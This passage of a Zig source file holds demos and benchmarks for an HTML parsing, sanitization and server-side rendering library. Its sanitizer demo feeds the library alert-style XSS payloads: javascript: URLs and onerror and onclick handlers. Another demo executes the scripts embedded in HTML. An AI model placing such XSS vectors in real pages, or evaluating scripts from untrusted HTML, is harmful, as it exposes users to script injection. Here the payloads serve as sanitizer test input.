        \\  <button disabled hidden onclick="alert('XSS')" phx-click="increment" data-invalid="bad" scope="invalid">Dangerous button</button>
        \\  <img src="javascript:alert('XSS')" alt="not safe" onerror="alert('hack')" loading="unknown">
        \\  <a href="javascript:alert('XSS')" target="_self" role="invalid">Dangerous link</a>
        \\  <p id="valid" class="good" aria-label="ok" style="bad" onload="bad()">Mixed attributes</p>
        \\  <custom-elt><p>Hi there</p></custom-elt>
        \\  <template>
        \\      <span>Reuse me</span>
        \\      <script>console.log('Hello from template');</script>
        \\  </template>
        \\</div>
    ;

    const doc = try z.createDocFromString(malicious_content);
    defer z.destroyDocument(doc);

    const body = z.bodyNode(doc).?;
    // const div = z.firstChild(body).?;
    // const text = z.firstChild(div).?;
    // const com = z.nextSibling(text).?;
    z.print("\n=== Demo visualiazing DOM and sanitization ------\n", .{});
    try z.prettyPrint(allocator, body);
    z.print("\n", .{});

    try z.sanitizeNode(allocator, body, .permissive);
    z.print("\nAfter sanitization (permissive mode):\n", .{});
    try z.prettyPrint(allocator, body);
    z.print("\n", .{});
}

/// Demo: Virtual DOM + SSR with Browser APIs
/// TODO: Complete implementation - currently disabled due to type compatibility issues
/// The concept is proven - see VIRTUAL_DOM_CONCEPT.md and src/dom_bridge.zig for details
///
/// This demonstrates the VISION: JavaScript code using browser APIs (document.createElement, etc.)
/// that directly manipulates a lexbor DOM tree. When complete, this will enable:
/// - Server-side rendering of React/Vue/Preact components
/// - HTMX backend generation with full JS scripting
/// - Template engines running at native speed
/// - Dynamic HTML generation with familiar browser APIs
fn demoVirtualDOM_SSR(allocator: std.mem.Allocator, ctx: ?*qjs.JSContext) !void {
    _ = allocator;
    _ = ctx;
    z.print("\n=== Virtual DOM Bridge - SSR Demo (Work in Progress) ------\n\n", .{});
    z.print("✨ CONCEPT: Map browser APIs → lexbor primitives\n", .{});
    z.print("📄 See VIRTUAL_DOM_CONCEPT.md for the full implementation strategy\n", .{});
    z.print("💾 See src/dom_bridge.zig for the bridge implementation (WIP)\n\n", .{});

    // TODO: Uncomment when type issues are resolved
    //
    // Example of what this will enable:
    //
    // // Create a DOM bridge
    // var bridge = try DOMBridge.init(allocator, ctx);
    // defer bridge.deinit();
    //
    // // Install browser-like APIs
    // try bridge.installAPIs();
    //
    // z.print("✅ Installed: document, window, console APIs\n\n", .{});
    //
    // // Now JavaScript can use browser APIs!
    // const ssr_script =
    //     \\// This JavaScript now runs with DOM APIs!
    //     \\console.log("Hello from Virtual DOM!");
    //     \\
    //     \\// Create elements using document API
    //     \\const div = document.createElement("div");
    //     \\div.setAttribute("class", "container");
    //     \\div.setAttribute("id", "app");
    //     \\
    //     \\const h1 = document.createElement("h1");
    //     \\h1.textContent = "Welcome to Zexplorer SSR!";
    //     \\
    //     \\const p = document.createElement("p");
    //     \\p.setAttribute("class", "description");
    //     \\p.textContent = "This HTML was generated by JavaScript running in QuickJS, using a virtual DOM backed by lexbor!";
    //     \\
    //     \\// Build the tree
    //     \\div.appendChild(h1);
    //     \\div.appendChild(p);
    //     \\
    //     \\// Append to body
    //     \\document.body.appendChild(div);
    //     \\
    //     \\// Return the result
    //     \\"SSR Complete!";
    // ;
    //
    // z.print("--- Executing JavaScript with DOM APIs ---\n", .{});
    // const result = qjs.JS_Eval(ctx, ssr_script, ssr_script.len, "<ssr>", 0);
    // defer qjs.JS_FreeValue(ctx, result);
    //
    // if (qjs.JS_IsException(result) != 0) {
    //     const exception = qjs.JS_GetException(ctx);
    //     defer qjs.JS_FreeValue(ctx, exception);
    //
    //     const error_str = qjs.JS_ToCString(ctx, exception);
    //     if (error_str != null) {
    //         defer qjs.JS_FreeCString(ctx, error_str);
    //         z.print("❌ Error: {s}\n", .{error_str});
    //     }
    //     return;
    // }
    //
    // const result_str = qjs.JS_ToCString(ctx, result);
    // if (result_str != null) {
    //     defer qjs.JS_FreeCString(ctx, result_str);
    //     z.print("Result: {s}\n\n", .{result_str});
    // }
    //
    // // Now extract the generated HTML from the lexbor DOM
    // z.print("--- Generated HTML (from lexbor DOM) ---\n", .{});
    // const body_node = z.bodyNode(bridge.doc).?;
    // const body_html = try z.innerHTML(allocator, z.nodeToElement(body_node).?);
    // defer allocator.free(body_html);
    //
    // z.print("{s}\n\n", .{body_html});
    //
    // // Pretty print it
    // z.print("--- Pretty Print ---\n", .{});
    // try z.prettyPrint(allocator, body_node);
    // z.print("\n", .{});
}

fn demoExecuteScriptFromHTML(allocator: std.mem.Allocator, ctx: ?*qjs.JSContext) !void {
    z.print("\n=== Demo extracting and executing <script> from HTML ------\n\n", .{});

    // Create HTML with embedded JavaScript
    // Note: <script> tags in <head> might be removed by the HTML parser
    const html_with_script =
        \\<!DOCTYPE html>
        \\<html>
        \\<body>
        \\  <h1>Test</h1>
        \\  <script>
        \\    function greet(name) {
        \\      return "Hello, " + name + "!";
        \\    }
        \\    var greeting_result = greet("QuickJS from Zig");
        \\    greeting_result;
        \\  </script>
        \\  <p>Content</p>
        \\  <script>
        \\    const data = { count: 42, items: ["a", "b", "c"] };
        \\    var json_result = JSON.stringify(data);
        \\    json_result;
        \\  </script>
        \\</body>
        \\</html>
    ;

    const doc = try z.createDocFromString(html_with_script);
    defer z.destroyDocument(doc);
    const node = z.documentRoot(doc).?;
    try z.prettyPrint(allocator, node);

    // Find all <script> elements
    const script_elements = try z.querySelectorAll(allocator, doc, "script");
    defer allocator.free(script_elements);

    z.print("Found {} <script> tags\n\n", .{script_elements.len});

    // Execute each script
    for (script_elements, 0..) |script_elt, i| {
        const script_content = z.textContent_zc(z.elementToNode(script_elt));

        if (script_content.len > 0) {
            z.print("Script #{}: Executing...\n", .{i + 1});
            z.print("--- JavaScript Code ---\n{s}\n", .{script_content});
            z.print("--- Execution Result ---\n", .{});

            const eval_result = qjs.JS_Eval(ctx, script_content.ptr, script_content.len, "<script>", 0);
            defer qjs.JS_FreeValue(ctx, eval_result);

            // Check for errors
            if (qjs.JS_IsException(eval_result) != 0) {
                const exception = qjs.JS_GetException(ctx);
                defer qjs.JS_FreeValue(ctx, exception);

                const error_str = qjs.JS_ToCString(ctx, exception);
                if (error_str != null) {
                    defer qjs.JS_FreeCString(ctx, error_str);
                    z.print("Error: {s}\n", .{error_str});
                }
            } else {
                // Get the result as string
                const result_str = qjs.JS_ToCString(ctx, eval_result);
                if (result_str != null) {
                    defer qjs.JS_FreeCString(ctx, result_str);
                    z.print("Result: {s}\n", .{result_str});
                } else {
                    z.print("(undefined)\n", .{});
                }
            }
            z.print("\n", .{});
        }
    }

    // Now we can access variables defined in the scripts
    z.print("--- Accessing JavaScript variables from Zig ---\n", .{});

    // Get the 'greeting_result' variable from first script
    const global = qjs.JS_GetGlobalObject(ctx);
    defer qjs.JS_FreeValue(ctx, global);

    const greeting_prop = qjs.JS_GetPropertyStr(ctx, global, "greeting_result");
    defer qjs.JS_FreeValue(ctx, greeting_prop);

    const greeting_str = qjs.JS_ToCString(ctx, greeting_prop);
    if (greeting_str != null) {
        defer qjs.JS_FreeCString(ctx, greeting_str);
        z.print("Variable 'greeting_result': {s}\n", .{greeting_str});
    }

    // Get the 'json_result' variable from second script
    const json_prop = qjs.JS_GetPropertyStr(ctx, global, "json_result");
    defer qjs.JS_FreeValue(ctx, json_prop);

    const json_str = qjs.JS_ToCString(ctx, json_prop);
    if (json_str != null) {
        defer qjs.JS_FreeCString(ctx, json_str);
        z.print("Variable 'json_result': {s}\n", .{json_str});
    }

    z.print("\n", .{});
}

fn zexplore_example_com(allocator: std.mem.Allocator, url: []const u8) !void {
    z.print("\n=== Demo visiting the page {s} --------------\n\n", .{url});
    const page = try z.get(allocator, url);
    defer allocator.free(page);
    const doc = try z.createDocFromString(page);
    defer z.destroyDocument(doc);
    const html = z.documentRoot(doc).?;
    try z.prettyPrint(allocator, html);

    var css_engine = try z.createCssEngine(allocator);
    defer css_engine.deinit();

    const a_link = try css_engine.querySelector(html, "a[href]");

    const href_value = z.getAttribute_zc(z.nodeToElement(a_link.?).?, "href").?;
    z.print("{s}\n", .{href_value});

    const style_by_walker = z.getElementByTag(html, .style);
    var css_content: []const u8 = undefined;
    if (style_by_walker) |style| {
        css_content = z.textContent_zc(z.elementToNode(style));
        z.print("{s}\n", .{css_content});
    }

    const style_by_css = try css_engine.querySelector(html, "style");

    if (style_by_css) |style| {
        const css_content_2 = z.textContent_zc(style);
        // z.print("{s}\n", .{css_content_2});
        std.debug.assert(std.mem.eql(u8, css_content, css_content_2));
    }
}

fn normalizeString_DOM_parsing_bencharmark(allocator: std.mem.Allocator) !void {

    // Create a medium-sized realistic page with lots of whitespace and comments
    var html_builder: std.ArrayList(u8) = .empty;
    defer html_builder.deinit(allocator);

    try html_builder.ensureTotalCapacity(allocator, 50_000);

    try html_builder.appendSlice(allocator,
        \\<!DOCTYPE html>
        \\<!-- Page header comment -->
        \\<html lang="en">
        \\  <head>
        \\    <meta charset="UTF-8"/>
        \\    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
        \\    <title>Medium Blog Post - Performance Test</title>
        \\    <link rel="stylesheet" href="/css/main.css"/>
        \\    <!-- Analytics comment -->
        \\    <script src="/js/analytics.js"></>
        \\  </head>
        \\  <body class="blog-layout">
        \\    <header class="site-header">
        \\      <nav class="main-nav">
        \\        <ul class="nav-list">
        \\          <li><a href="/">Home</a></li>
        \\          <li><a href="/blog">Blog</a></li>
        \\          <li><a href="/about">About</a></li>
        \\        </ul>
        \\        <!-- Navigation comment -->
        \\        <code> const std = @import("std");\n const z = @import("../root.zig");\n</code>
        \\      </nav>
        \\    </header>
        \\
        \\    <main class="content">
    );

    // Add multiple blog posts
    for (0..20) |i| {
        try html_builder.appendSlice(allocator,
            \\      <article class="blog-post">
            \\        <!-- Post comment -->
            \\        <header class="post-header">
            \\          <h2 class="post-title">
        );

        const title = try std.fmt.allocPrint(allocator, "Blog Post #{d}: Performance Testing", .{i + 1});
        defer allocator.free(title);
        try html_builder.appendSlice(allocator, title);

        try html_builder.appendSlice(allocator,
            \\</h2>
            \\          <div class="post-meta">
            \\            <span class="author">John Doe</span>
            \\            <time datetime="2024-01-01">January 1, 2024</time>
            \\          </div>
            \\        </header>
            \\
            \\        <div class="post-content">
            \\          <p>This is a sample blog post to test our <strong>HTML normalization</strong>
            \\             and <em>tuple serialization</em> performance. The content includes various
            \\             HTML elements and whitespace patterns.</p>
            \\
            \\          <!-- Content comment -->
            \\          <blockquote>
            \\            "Performance is not just about speed, but about providing
            \\             a smooth user experience."
            \\          </blockquote>
            \\
            \\          <ul class="feature-list">
            \\            <li>Fast HTML parsing with lexbor</li>
            \\            <li>Efficient DOM normalization</li>
            \\            <li>High-performance tuple serialization</li>
            \\            <li>Memory-optimized string processing</li>
            \\          </ul>
            \\
            \\          <div class="code-example">
            \\            <pre><code>const html = createDocFromString(input);
            \\const normalized = normalizeDOM(html);
            \\const tuple = domToTuple(normalized);</code></pre>
            \\          </div>
            \\
            \\          <form class="contact-form">
            \\            <div class="form-group">
            \\              <label for="email">Email:</label>
            \\              <input type="email" id="email" name="email" required/>
            \\            </div>
            \\            <button type="submit">Subscribe</button>
            \\          </form>
            \\        </div>
            \\
            \\        <footer class="post-footer">
            \\          <div class="tags">
            \\            <span class="tag">performance</span>
            \\            <span class="tag">html</span>
            \\            <span class="tag">optimization</span>
            \\          </div>
            \\        </footer>
            \\      </article>
            \\
        );
    }

    try html_builder.appendSlice(allocator,
        \\    </main>
        \\
        \\    <aside class="sidebar">
        \\      <!-- Sidebar comment -->
        \\      <div class="widget recent-posts">
        \\        <h3>Recent Posts</h3>
        \\        <ul>
        \\          <li><a href="/post1">Understanding Performance</a></li>
        \\          <li><a href="/post2">Memory Optimization Techniques</a></li>
        \\          <li><a href="/post3">DOM Processing Strategies</a></li>
        \\        </ul>
        \\      </div>
        \\
        \\      <div class="widget newsletter">
        \\        <h3>Newsletter</h3>
        \\        <p>   Stay updated with our latest posts   </p>
        \\        <form>
        \\          <input type="email" placeholder="Your email"/>
        \\          <button>Subscribe</button>
        \\        </form>
        \\      </div>
        \\    </aside>
        \\
        \\    <footer class="site-footer">
        \\      <!-- Footer comment -->
        \\      <p>&copy; 2024 Performance Blog. All rights reserved.</p>
        \\    </footer>
        \\
        \\    <script>
        \\      // Performance tracking
        \\      console.log('Page loaded in:', performance.now(), 'ms');
        \\    </script>
        \\  </body>
        \\</html>
    );

    const medium_html = try html_builder.toOwnedSlice(allocator);
    defer allocator.free(medium_html);

    const iterations = 500;
    // Call the reorganized benchmark function
    try cleanBenchmark(allocator, medium_html, iterations);
}

fn cleanBenchmark(allocator: std.mem.Allocator, medium_html: []const u8, iterations: usize) !void {
    z.print("\n=== HTML PARSING & NORMALIZATION BENCHMARK ===\n\n", .{});
    z.print("HTML size: {d} bytes (~{d:.1}KB)\n", .{ medium_html.len, @as(f64, @floatFromInt(medium_html.len)) / 1024.0 });
    z.print("Iterations: {d}\n\n", .{iterations});

    var timer = try std.time.Timer.start();

    // Performance calculation constants
    const ns_to_ms = @as(f64, @floatFromInt(std.time.ns_per_ms));
    const kb_size = @as(f64, @floatFromInt(medium_html.len)) / 1024.0;
    const iter = @as(f64, @floatFromInt(iterations));

    // ===================================================================
    // GROUP A: STRING NORMALIZATION + REUSED DOCUMENT
    // ===================================================================
    z.print("=== A. STRING NORMALIZATION → REUSED DOC ===\n", .{});

    // A1: String normalization → parseString (reused doc)
    timer.reset();
    const docA1 = try z.createDocument();
    defer z.destroyDocument(docA1);
    for (0..iterations) |_| {
        const normalized = try z.normalizeHtmlStringWithOptions(allocator, medium_html, .{
            .remove_comments = true,
            .remove_whitespace_text_nodes = true,
        });
        defer allocator.free(normalized);
        try z.parseString(docA1, normalized);
        try z.parseString(docA1, ""); // reset
    }
    const timeA1 = timer.read();
    const msA1 = @as(f64, @floatFromInt(timeA1)) / ns_to_ms;

    // A2: String normalization → parseAndAppend (reused doc, with cloning)
    timer.reset();
    const docA2 = try z.createDocFromString("");
    defer z.destroyDocument(docA2);
    var parserA2 = try z.Parser.init(allocator);
    defer parserA2.deinit();
    const bodyA2 = z.bodyElement(docA2);
    for (0..iterations) |_| {
        const normalized = try z.normalizeHtmlStringWithOptions(allocator, medium_html, .{
            .remove_comments = true,
            .remove_whitespace_text_nodes = true,
        });
        defer allocator.free(normalized);
        try parserA2.parseAndAppend(bodyA2.?, normalized, .body, .none);
        _ = try z.setInnerHTML(bodyA2.?, ""); // reset
    }
    const timeA2 = timer.read();
    const msA2 = @as(f64, @floatFromInt(timeA2)) / ns_to_ms;

    // A3: String normalization → parseAndAppend (reused doc, no cloning - OPTIMIZED!)
    timer.reset();
    const docA3 = try z.createDocFromString("");
    defer z.destroyDocument(docA3);
    var parserA3 = try z.Parser.init(allocator);
    defer parserA3.deinit();
    const bodyA3 = z.bodyElement(docA3);
    for (0..iterations) |_| {
        const normalized = try z.normalizeHtmlStringWithOptions(allocator, medium_html, .{
            .remove_comments = true,
            .remove_whitespace_text_nodes = true,
        });
        defer allocator.free(normalized);
        try parserA3.parseAndAppend(bodyA3.?, normalized, .body, .none);
        _ = try z.setInnerHTML(bodyA3.?, ""); // reset
    }
    const timeA3 = timer.read();
    const msA3 = @as(f64, @floatFromInt(timeA3)) / ns_to_ms;

    z.print("A1. reuse doc, no parser, string norm → parseString:                      {d:.2} ms/op, {d:.1} kB/s\n", .{ msA1 / iter, kb_size * iter / msA1 });
    z.print("A2. reuse doc,    parser, string norm → parseAndAppend (cloning):         {d:.2} ms/op, {d:.1} kB/s\n", .{ msA2 / iter, kb_size * iter / msA2 });
    z.print("A3. reuse doc,    parser, string norm → parseAndAppend (NO clone):        {d:.2} ms/op, {d:.1} kB/s\n", .{ msA3 / iter, kb_size * iter / msA3 });

    // C1: String normalization → createDocFromString (fresh doc each time)
    timer.reset();
    for (0..iterations) |_| {
        const normalized = try z.normalizeHtmlStringWithOptions(allocator, medium_html, .{
            .remove_comments = true,
            .remove_whitespace_text_nodes = true,
        });
        defer allocator.free(normalized);
        const docC1 = try z.createDocFromString(normalized);
        defer z.destroyDocument(docC1);
    }
    const timeC1 = timer.read();
    const msC1 = @as(f64, @floatFromInt(timeC1)) / ns_to_ms;

    z.print("C1. new doc,   no parser, string norm → (new doc) createDocFromString:    {d:.2} ms/op, {d:.1} kB/s ⭐\n", .{ msC1 / iter, kb_size * iter / msC1 });
    // ===================================================================
    // GROUP B: DOM NORMALIZATION + FRESH DOCUMENTS
    // ===================================================================
    z.print("\n=== B. RAW HTML → FRESH DOC → DOM NORMALIZATION ===\n", .{});

    // B1: Raw HTML → parser.parse (fresh doc) → DOM normalization
    timer.reset();
    var parserB1 = try z.Parser.init(allocator);
    defer parserB1.deinit();
    for (0..iterations) |_| {
        const docB1 = try parserB1.parse(medium_html, .none);
        defer z.destroyDocument(docB1);
        const bodyB1 = z.bodyElement(docB1);
        try z.normalizeDOMwithOptions(allocator, bodyB1.?, .{ .skip_comments = true });
    }
    const timeB1 = timer.read();
    const msB1 = @as(f64, @floatFromInt(timeB1)) / ns_to_ms;

    // B2: Raw HTML → createDocFromString (fresh doc) → DOM normalization
    timer.reset();
    for (0..iterations) |_| {
        const docB2 = try z.createDocFromString(medium_html);
        defer z.destroyDocument(docB2);
        const bodyB2 = z.bodyElement(docB2);
        try z.normalizeDOMwithOptions(allocator, bodyB2.?, .{ .skip_comments = true });
    }
    const timeB2 = timer.read();
    const msB2 = @as(f64, @floatFromInt(timeB2)) / ns_to_ms;

    z.print("B1.    parser, → (new doc) parser.parse        → DOM norm:    {d:.2} ms/op, {d:.1} kB/s ⭐\n", .{ msB1 / iter, kb_size * iter / msB1 });
    z.print("B2. no parser, → (new doc) createDocFromString → DOM norm:    {d:.2} ms/op, {d:.1} kB/s\n", .{ msB2 / iter, kb_size * iter / msB2 });

    // ===================================================================
    // GROUP C: STRING NORMALIZATION + FRESH DOCUMENTS
    // ===================================================================
    z.print("\n=== C. STRING NORM → FRESH DOC ===\n", .{});

    // ===================================================================
    // GROUP D: RAW HTML (NO NORMALIZATION)
    // ===================================================================
    z.print("\n=== D. RAW HTML (NO NORMALIZATION) ===\n", .{});

    // D1: Raw HTML → parseString (reused doc, clear between)
    timer.reset();
    const docD1 = try z.createDocument();
    defer z.destroyDocument(docD1);
    for (0..iterations) |_| {
        try z.parseString(docD1, medium_html);
        try z.parseString(docD1, ""); // Clear
    }
    const timeD1 = timer.read();
    const msD1 = @as(f64, @floatFromInt(timeD1)) / ns_to_ms;

    // D2: Raw HTML → parser.parse (fresh doc each time)
    timer.reset();
    var parserD2 = try z.Parser.init(allocator);
    defer parserD2.deinit();
    for (0..iterations) |_| {
        const docD2 = try parserD2.parse(medium_html, .none);
        defer z.destroyDocument(docD2);
    }
    const timeD2 = timer.read();
    const msD2 = @as(f64, @floatFromInt(timeD2)) / ns_to_ms;

    // D3: Raw HTML → createDocFromString (fresh doc each time)
    timer.reset();
    for (0..iterations) |_| {
        const docD3 = try z.createDocFromString(medium_html);
        defer z.destroyDocument(docD3);
    }
    const timeD3 = timer.read();
    const msD3 = @as(f64, @floatFromInt(timeD3)) / ns_to_ms;

    // D4: Raw HTML → parseAndAppend (reused doc, no normalization - ULTIMATE!)
    timer.reset();
    const docD4 = try z.createDocFromString("");
    defer z.destroyDocument(docD4);
    var parserD4 = try z.Parser.init(allocator);
    defer parserD4.deinit();
    const bodyD4 = z.bodyElement(docD4);
    for (0..iterations) |_| {
        try parserD4.parseAndAppend(bodyD4.?, medium_html, .body, .none);
        _ = try z.setInnerHTML(bodyD4.?, ""); // reset
    }
    const timeD4 = timer.read();
    const msD4 = @as(f64, @floatFromInt(timeD4)) / ns_to_ms;

    z.print("D1. reuse doc, no parser → parseString:           {d:.2} ms/op, {d:.1} kB/s  🚀\n", .{ msD1 / iter, kb_size * iter / msD1 });
    z.print("D2. new doc,      parser → parser.parse:          {d:.2} ms/op, {d:.1} kB/s\n", .{ msD2 / iter, kb_size * iter / msD2 });
    z.print("D3. new doc,   no parser → createDocFromString:   {d:.2} ms/op, {d:.1} kB/s\n", .{ msD3 / iter, kb_size * iter / msD3 });
    z.print("D4. reuse doc,    parser, parseAndAppend:         {d:.2} ms/op, {d:.1} kB/s  \n", .{ msD4 / iter, kb_size * iter / msD4 });

    // ===================================================================
    // SUMMARY & KEY INSIGHTS
    // ===================================================================
    z.print("\n=== KEY INSIGHTS ===\n", .{});
    z.print("🚀 FASTEST: D1 (raw parseString, reused doc)    = {d:.1} kB/s\n", .{kb_size * iter / msD1});
    z.print("⭐ DOM NORM: B1 (parser, new doc = parser.parse + DOM norm) = {d:.1} kB/s\n", .{kb_size * iter / msB1});
    z.print("\n\n", .{});
    z.print("- createDocFromString parses directly into fresh document\n", .{});
    z.print("- Reused documents have reset overhead (parseString(\"\"))\n", .{});
    z.print("- parseAndAppend has fragment creation/template wrapping overhead\n", .{});
    z.print("- DOM normalization is significantly faster than string pre-normalization\n", .{});
}

/// Simple template interpolation - replaces {key} with values
fn interpolateTemplate(allocator: std.mem.Allocator, template: []const u8, key: []const u8, value: []const u8) ![]u8 {
    const placeholder = try std.fmt.allocPrint(allocator, "{{{s}}}", .{key});
    defer allocator.free(placeholder);

    // Count occurrences to pre-allocate
    var count: usize = 0;
    var pos: usize = 0;
    while (std.mem.indexOf(u8, template[pos..], placeholder)) |found| {
        count += 1;
        pos += found + placeholder.len;
    }

    if (count == 0) {
        return try allocator.dupe(u8, template);
    }

    // Calculate new size and allocate
    const new_size = template.len + (value.len * count) - (placeholder.len * count);
    var result = try std.ArrayList(u8).initCapacity(allocator, new_size);

    pos = 0;
    while (std.mem.indexOf(u8, template[pos..], placeholder)) |found| {
        const actual_pos = pos + found;
        try result.appendSlice(allocator, template[pos..actual_pos]);
        try result.appendSlice(allocator, value);
        pos = actual_pos + placeholder.len;
    }
    try result.appendSlice(allocator, template[pos..]);

    return result.toOwnedSlice(allocator);
}

/// Server-side rendering benchmark - simulates HTMX-like behavior
/// Load DOM once, parse/CSS engines once, then repeatedly:
/// 1. Target elements with CSS selectors
/// 2. Modify found nodes with template interpolation
/// 3. Serialize modified HTML
/// 4. Verify original DOM stays untouched
fn serverSideRenderingBenchmark(allocator: std.mem.Allocator) !void {
    z.print("\n=== SERVER-SIDE RENDERING BENCHMARK (HTMX-like) ===\n", .{});

    // Create the same medium-sized realistic page (38kB) used in the parsing benchmark
    var html_builder: std.ArrayList(u8) = .empty;
    defer html_builder.deinit(allocator);
    try html_builder.ensureTotalCapacity(allocator, 50_000);
    try html_builder.appendSlice(allocator,
        \\<!DOCTYPE html>
        \\<!-- Page header comment -->
        \\<html lang="en">
        \\  <head>
        \\    <meta charset="UTF-8"/>
        \\    <title>Performance Blog - Testing HTML Parser</title>
        \\    <meta name="description" content="A test blog for performance benchmarking"/>
        \\    <meta name="viewport" content="width=device-width, initial-scale=1"/>
        \\    <link rel="stylesheet" href="/css/main.css"/>
        \\    <link rel="preconnect" href="https://fonts.googleapis.com"/>
        \\    <style>
        \\      /* Inline CSS for performance testing */
        \\      .blog-post { margin: 2rem 0; padding: 1.5rem; }
        \\      .post-title { color: #333; font-size: 1.5rem; }
        \\      .post-meta { color: #666; font-size: 0.9rem; }
        \\      /* More CSS rules... */
        \\    </style>
        \\    <script src="/js/analytics.js"></>
        \\  </head>
        \\  <body class="blog-layout">
        \\    <header class="site-header">
        \\      <nav class="main-nav">
        \\        <ul class="nav-list">
        \\          <li><a href="/">Home</a></li>
        \\          <li><a href="/blog">Blog</a></li>
        \\          <li><a href="/about">About</a></li>
        \\        </ul>
        \\        <!-- Navigation comment -->
        \\        <code> const std = @import("std");\n const z = @import("../root.zig");\n</code>
        \\      </nav>
        \\    </header>
        \\
        \\    <main class="content">
    );

    // Add multiple blog posts
    for (0..20) |i| {
        try html_builder.appendSlice(allocator,
            \\      <article class="blog-post" data-post-id="{post_id}">
            \\        <!-- Post comment -->
            \\        <header class="post-header">
            \\          <h2 class="post-title" hx-get="/posts/{post_id}/edit" hx-target="#edit-modal">
        );
        const title = try std.fmt.allocPrint(allocator, "Blog Post #{d}: {s}", .{ i + 1, "title_template" });
        defer allocator.free(title);
        try html_builder.appendSlice(allocator, title);
        try html_builder.appendSlice(allocator,
            \\</h2>
            \\          <div class="post-meta">
            \\            <span class="author">{author_name}</span>
            \\            <time datetime="2024-01-01">{publish_date}</time>
            \\            <span class="views" hx-get="/posts/{post_id}/views" hx-trigger="revealed">{view_count} views</span>
            \\          </div>
            \\        </header>
            \\
            \\        <div class="post-content">
            \\          <p>Welcome {user_name}! This is a sample blog post content for performance testing. It contains <strong>bold text</strong>, <em>italic text</em>, and <a href="/link">links</a>.</p>
            \\          <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Current user: {user_name}, Post ID: {post_id}</p>
            \\          
            \\          <blockquote>
            \\            <p>This is a quote block for testing purposes.</p>
            \\            <cite>{quote_author}</cite>
            \\          </blockquote>
            \\
            \\          <ul class="post-list">
            \\            <li>First list item with <code>inline code</code></li>
            \\            <li>Second list item for {user_name}</li>
            \\            <li>Third list item - {notification_count} notifications</li>
            \\          </ul>
            \\
            \\          <div class="newsletter-signup">
            \\            <h3>Subscribe to Newsletter, {user_name}!</h3>
            \\            <form hx-post="/newsletter/subscribe" hx-swap="outerHTML">
            \\              <div class="form-group">
            \\                <label for="email">Email:</label>
            \\                <input type="email" id="email" name="email" value="{user_email}" required/>
            \\              </div>
            \\              <button type="submit" hx-loading-states>Subscribe Now</button>
            \\            </form>
            \\          </div>
            \\        </div>
            \\
            \\        <footer class="post-footer">
            \\          <div class="tags">
            \\            <span class="tag">performance</span>
            \\            <span class="tag">html</span>
            \\            <span class="tag">{dynamic_tag}</span>
            \\          </div>
            \\          <div class="actions">
            \\            <button hx-post="/posts/{post_id}/like" hx-swap="innerHTML">❤️ {like_count}</button>
            \\            <button hx-get="/posts/{post_id}/comments" hx-target="#comments-{post_id}">💬 {comment_count}</button>
            \\          </div>
            \\        </footer>
            \\      </article>
            \\
        );
    }
    try html_builder.appendSlice(allocator,
        \\    </main>
        \\
        \\    <aside class="sidebar">
        \\      <!-- Sidebar comment -->
        \\      <div class="widget recent-posts">
        \\        <h3>Recent Posts</h3>
        \\        <ul>
        \\          <li><a href="/post1">Recent Post 1</a></li>
        \\          <li><a href="/post2">Recent Post 2</a></li>
        \\          <li><a href="/post3">Recent Post 3</a></li>
        \\        </ul>
        \\      </div>
        \\
        \\      <div class="widget newsletter">
        \\        <h3>Newsletter</h3>
        \\        <p>Subscribe to our newsletter for updates.</p>
        \\        <form>
        \\          <input type="email" placeholder="Your email"/>
        \\          <button>Subscribe</button>
        \\        </form>
        \\      </div>
        \\    </aside>
        \\
        \\    <footer class="site-footer">
        \\      <!-- Footer comment -->
        \\      <p>&copy; 2024 Performance Blog. All rights reserved.</p>
        \\    </footer>
        \\
        \\    <script>
        \\      // Performance tracking
        \\      console.log('Page loaded in:', performance.now(), 'ms');
        \\    </script>
        \\  </body>
        \\</html>
    );

    // Setup - load document once for all operations (using medium 38kB HTML)
    const original_html = try html_builder.toOwnedSlice(allocator);
    defer allocator.free(original_html);

    // Load document once (like loading a template in server memory)
    const doc = try z.createDocFromString(original_html);
    defer z.destroyDocument(doc);

    // Setup parser once
    var parser = try z.Parser.init(allocator);
    defer parser.deinit();

    // Store original content for verification
    const original_content = try z.outerNodeHTML(allocator, z.documentRoot(doc).?);
    defer allocator.free(original_content);

    z.print("Original document loaded ({} bytes)\n", .{original_content.len});

    // Benchmark parameters
    const iterations = 1000;
    const ns_to_ms: f64 = 1_000_000.0;

    // Test scenario 1: Update blog post titles dynamically
    z.print("\n--- Test 1: Dynamic blog post title updates ---\n", .{});
    var timer = std.time.Timer.start() catch unreachable;

    for (0..iterations) |i| {
        // 1. Target first blog post title with CSS selector
        const title_elements = try z.querySelectorAll(allocator, doc, ".post-title");
        defer allocator.free(title_elements);

        if (title_elements.len > 0) {
            const title_element = title_elements[0];

            // 2. Clone the element for modification (original stays untouched)
            const cloned_title = z.cloneNode(z.elementToNode(title_element)).?;
            defer z.destroyNode(cloned_title);

            // 3. Modify the cloned element
            const new_title = try std.fmt.allocPrint(allocator, "Updated Blog Post #{}", .{i + 1});
            defer allocator.free(new_title);
            _ = try z.setInnerHTML(z.nodeToElement(cloned_title).?, new_title);

            // 4. Serialize modified element (this is what gets sent to client)
            const modified_html = try z.outerHTML(allocator, z.nodeToElement(cloned_title).?);
            defer allocator.free(modified_html);

            // In real HTMX scenario, this HTML would be sent as response
            // Track total bytes processed (simulate using the HTML)
            if (modified_html.len == 0) unreachable; // Should never be empty
        }
    }

    const time1 = timer.read();
    const ms1 = @as(f64, @floatFromInt(time1)) / ns_to_ms;
    z.print("Test 1: {d:.2} ms/op ({d:.0} ops/sec)\n", .{ ms1 / iterations, iterations * 1000.0 / ms1 });

    // Test scenario 2: Update newsletter signup forms with new content
    z.print("\n--- Test 2: Dynamic newsletter form updates ---\n", .{});
    timer.reset();

    for (0..iterations) |i| {
        // Target newsletter signup buttons with CSS selector
        const buttons = try z.querySelectorAll(allocator, doc, ".newsletter-signup button");
        defer allocator.free(buttons);

        if (buttons.len > 0) {
            const button = buttons[0];

            // Clone and modify
            const cloned_button = z.cloneNode(z.elementToNode(button)).?;
            defer z.destroyNode(cloned_button);

            const new_text = try std.fmt.allocPrint(allocator, "Subscribe Now #{}", .{i + 1});
            defer allocator.free(new_text);
            _ = try z.setInnerHTML(z.nodeToElement(cloned_button).?, new_text);

            // Add new attributes for tracking
            _ = z.setAttribute(z.nodeToElement(cloned_button).?, "data-campaign", "dynamic");
            const iteration_str = try std.fmt.allocPrint(allocator, "{}", .{i});
            defer allocator.free(iteration_str);
            _ = z.setAttribute(z.nodeToElement(cloned_button).?, "data-iteration", iteration_str);

